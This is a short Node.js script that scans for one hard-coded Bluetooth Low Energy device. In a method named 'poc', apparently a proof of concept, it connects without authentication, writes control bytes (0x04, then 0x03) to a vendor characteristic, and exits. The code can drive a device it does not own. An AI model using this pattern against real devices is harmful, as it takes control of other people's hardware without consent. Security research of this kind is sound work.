// d2be738770db

const Promise = require('bluebird');
const noble = require('noble');

let once = false;

class BeaconScanner {
  constructor(filter = []) {
    this._filter = filter;
    this.onSignal = () => {
    };
    this._is_scanning = false;
    noble.startScanningAsync = Promise.promisify(noble.startScanning);
  }

  stopScan() {
    noble.removeAllListeners('discover');
    if (this._is_scanning) {
      noble.stopScanning();
      this._is_scanning = false;
    }
  }

  startScan() {
    return this._init()
      .then(() => this._prepareScan());
  }

  _init() {
    if (noble.state === 'poweredOn') {
      return Promise.resolve();
    }

    return new Promise((resolve, reject) => {
      noble.once('stateChange', (state) => {
        if (state !== 'poweredOn') {
          return reject(new Error(`Failed to initialize the Noble object: ${state}`));
        }

        return resolve();
      });
    });
  }

  poc(peripheral) {
    peripheral.connect((err) => {
      peripheral.discoverServices('0000ff0000001000800000805f9b34fb', (err, [service]) => {
        service.discoverCharacteristics('0000ff0100001000800000805f9b34fb', (err, [characteristic]) => {

          characteristic.write(Buffer.from('04', 'hex'), false, () => {});
          setTimeout(() => {
            characteristic.write(Buffer.from('03', 'hex'), false, () => {
              peripheral.disconnect();
              process.exit(0);
            });
          }, 5000);

        });
      });
    });
  }

  _prepareScan() {
    return noble.startScanningAsync([], true)
      .then(() => {
        noble.on('discover', (peripheral) => {
          if (!this._filter.length || this._filter.includes(peripheral.uuid)) {
            console.log('...');
            if (!once) {
              once = true;
              this.onSignal(peripheral);
              this.poc(peripheral);
            }
          }
        });
        this._is_scanning = true;
      });
  }
}

scanner = new BeaconScanner(['71bc234c725b']);
scanner.startScan();
